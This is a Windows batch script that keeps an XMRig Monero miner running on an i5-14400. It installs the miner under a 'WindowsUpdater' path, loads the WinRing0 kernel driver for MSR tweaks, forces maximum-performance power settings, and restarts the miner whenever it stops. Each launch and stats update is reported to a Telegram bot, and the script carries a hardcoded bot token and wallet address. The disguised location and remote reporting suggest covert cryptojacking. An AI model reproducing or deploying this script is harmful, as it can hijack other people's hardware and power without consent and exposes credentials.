@echo off
setlocal enabledelayedexpansion

:: === Config ===
set "MUTEX_FILE=%TEMP%\xmrig_watchdog.lock"
set "XMRIG_PATH=C:\ProgramData\WindowsUpdater\xmrig.exe"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "PASSWORD=%COMPUTERNAME%"
set "ALGO=rx/0"
set "API_PORT=16000"

:: Telegram Alerts
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

:: CPU Tweaks (for i5-14400)
set "THREADS=12"
set "CPU_PRIORITY=4"
set "CPU_MAX_HINT=95"
set "AFFINITY_MASK=0x5555"
set "MSR_READY=0"

:: Auto-cleanup on reboot
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "XMRIG_Cleanup" /t REG_SZ /d "cmd /c del %TEMP%\xmrig_watchdog.lock" /f >nul

:: === Lock to single instance ===
if exist "!MUTEX_FILE!" (
    echo [!] Watchdog already running. Exiting.
    exit /b
)
echo locked > "!MUTEX_FILE!"

:: === System Performance Tweaks ===
echo [*] Applying system performance tweaks...
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100 >nul
powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100 >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d 0 /f >nul
bcdedit /deletevalue useplatformclock >nul 2>&1

:: === MSR Mod ===
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1
timeout /t 1 >nul
if exist "%~dp0winring0x64.sys" (
    sc create WinRing0_1_2_0 binPath= "\??\%~dp0winring0x64.sys" type= kernel start= demand >nul
    sc start WinRing0_1_2_0 >nul
    timeout /t 2 >nul
    "!XMRIG_PATH!" --msr-test >nul && set "MSR_READY=1"
)

:: === Main Loop ===
set "TICK=0"
:loop
tasklist /fi "imagename eq xmrig.exe" | find /i "xmrig.exe" >nul
if errorlevel 1 (
    echo [*] Starting optimized XMRig...

    if "!MSR_READY!"=="1" (
        start /min /affinity !AFFINITY_MASK! "" "!XMRIG_PATH!" ^
            -o !POOL! -u !WALLET! -p !PASSWORD! -a !ALGO! -k ^
            --donate-level=0 --randomx-1gb-pages ^
            --threads=!THREADS! --cpu-priority=!CPU_PRIORITY! ^
            --cpu-max-threads-hint=!CPU_MAX_HINT! ^
            --msr --asm=auto:fast --randomx-mode=fast ^
            --randomx-init=1 --randomx-wrmsr=-1 --cpu-no-yield ^
            --http-port=!API_PORT! --max-cpu-usage=90
    ) else (
        start /min /affinity !AFFINITY_MASK! "" "!XMRIG_PATH!" ^
            -o !POOL! -u !WALLET! -p !PASSWORD! -a !ALGO! -k ^
            --donate-level=0 --randomx-1gb-pages ^
            --threads=!THREADS! --cpu-priority=!CPU_PRIORITY! ^
            --cpu-max-threads-hint=!CPU_MAX_HINT! ^
            --randomx-init=1 --randomx-wrmsr=-1 --cpu-no-yield ^
            --http-port=!API_PORT! --max-cpu-usage=90
    )

    set "TICK=420"
    timeout /t 10 >nul
    curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
      -d "chat_id=!TG_CHAT_ID!" ^
      -d "text=⚡ *XMRig LAUNCHED (i5-14400 MAX)*`n• Threads: !THREADS!`n• MSR: !MSR_READY!`n• %time%" ^
      -d "parse_mode=Markdown"
)

:: === Stats Reporting (every 7 min) ===
set /a TICK+=30
if !TICK! GEQ 420 (
    set "TICK=0"
    for /f "tokens=* delims=" %%s in (
        'powershell -Command "try {(Invoke-WebRequest -UseBasicParsing http://127.0.0.1:!API_PORT!/1/summary).Content} catch {''}"'
    ) do set "STATS=%%s"

    for /f "tokens=2 delims=:" %%H in ('echo !STATS! ^| findstr /i "hashrate"') do set "HASHRATE=%%H"
    for /f "tokens=2 delims=:" %%A in ('echo !STATS! ^| findstr /i "accepted"') do set "ACCEPTED=%%A"
    for /f "tokens=2 delims=:" %%M in ('echo !STATS! ^| findstr /i "msr"') do set "MSR=%%M"
    for /f "tokens=2 delims=:" %%T in ('echo !STATS! ^| findstr /i "total"') do set "TOTAL=%%T"

    curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
      -d "chat_id=!TG_CHAT_ID!" ^
      -d "text=📈 *i5-14400 Status:*`n• ⚙️ Hashrate: *!HASHRATE!*`n• ✅ Shares: !ACCEPTED!`n• 🧠 MSR: !MSR!*`n• Threads: !THREADS!`n• Time: %time%" ^
      -d "parse_mode=Markdown"
)

timeout /t 30 >nul
goto loop
